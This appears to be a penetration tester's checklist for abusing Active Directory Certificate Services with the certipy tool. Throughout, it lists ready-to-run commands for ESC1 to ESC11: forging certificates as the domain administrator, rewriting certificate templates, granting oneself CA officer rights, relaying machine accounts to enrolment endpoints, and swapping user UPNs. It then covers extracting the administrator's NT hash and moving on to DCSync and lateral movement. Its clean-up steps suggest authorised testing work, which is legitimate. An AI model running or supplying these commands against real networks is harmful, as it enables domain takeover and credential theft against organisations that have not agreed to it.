# ADCS

## Before I start
sudo ntpdate <DCIP>
- [ ] KRB_AP_ERR_SKEW on a line below: the clock again, right before it
- [ ] At the pwn-broker prompt: tool install certipy
- [ ] Any domain credential will do: a password, or an NT hash with -hashes ':<Hash>'

## Find the vulnerable templates and CAs
certipy find -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -vulnerable -stdout
certipy find -u '<Username>@<Domain>' -hashes ':<Hash>' -dc-ip <DCIP> -vulnerable -stdout
- [ ] Each [!] line names the ESC and the template or CA it is on
- [ ] The whole report kept, for the names and the clean up: drop -stdout for the files

## ESC1: the template lets me name the subject
A template I can enrol in that builds a client-auth cert for any user I name.
certipy req -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -template '<Template>' -upn administrator@<Domain>
- [ ] The CA on a different host than the DC: add -target with its host name, from the find output
- [ ] A DC patched for CVE-2022-26923: add the target's SID so the cert still maps
certipy req -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -template '<Template>' -upn administrator@<Domain> -sid '<DomainSID>-500'
- [ ] administrator.pfx written: on to ## Log in with the certificate

## ESC2 and ESC3: Any Purpose or an enrolment agent
- [ ] ESC2 (Any Purpose or no EKU): request as in ESC1, then use the cert the same way
- [ ] ESC3 gives an enrolment-agent cert; get it first, then sign a request for anyone
certipy req -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -template '<Template>' -on-behalf-of '<Domain>\administrator' -pfx agent.pfx

## ESC4: I can write the template
Make it an ESC1, request as above, then put it back. -save-configuration writes the backup I restore from.
certipy template -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -template '<Template>' -save-configuration '<Template>.json' -write-default-configuration
- [ ] The template is an ESC1 now: request the cert as in ESC1, then restore it from the backup
certipy template -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -template '<Template>' -write-configuration '<Template>.json'

## ESC6 and ESC7: the CA itself
- [ ] ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 set): any template takes -upn, so request as in ESC1
- [ ] ESC7 (ManageCA): make myself an officer, enable a client-auth template, approve my own request
certipy ca -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -add-officer '<Username>'
certipy ca -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -ca '<CA>' -enable-template '<Template>'

## ESC8 and ESC11: relay to enrolment
The CA's HTTP enrolment takes a relayed machine account: coerce a DC and relay it, :Pb responder.
certipy relay -target 'http://<DCIP>' -template DomainController
- [ ] The DC's cert from the relay logs in as the DC, enough for a DCSync
- [ ] ESC11: the CA's RPC enrolment, with no packet privacy, takes the same relay
certipy relay -target 'rpc://<DCIP>' -ca '<CA>'

## ESC9 and ESC10: weak certificate mapping
With GenericWrite over <TargetUser>, set its UPN to a victim, request, then set it back.
certipy account update -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -user '<TargetUser>' -upn administrator
- [ ] The old userPrincipalName noted first, to restore it after the request

## Log in with the certificate
certipy auth -pfx administrator.pfx -dc-ip <DCIP>
- [ ] It prints the NT hash and writes a TGT: pass the hash, or KRB5CCNAME for the ticket
- [ ] KDC_ERR_PADATA_TYPE_NOSUPP: no PKINIT on the DC, so bind over LDAP with the cert instead
certipy auth -pfx administrator.pfx -dc-ip <DCIP> -ldap-shell

## Clean up and next
- [ ] Any template changed for ESC4 restored from its .json, any officer added for ESC7 removed
- [ ] Any UPN changed for ESC9 set back to the one I noted
- [ ] The NT hash tried everywhere, the account marked Owned in BloodHound: :Pb lateral-movement
- [ ] DCSync with the domain controller's own hash: :Pb acl-abuse
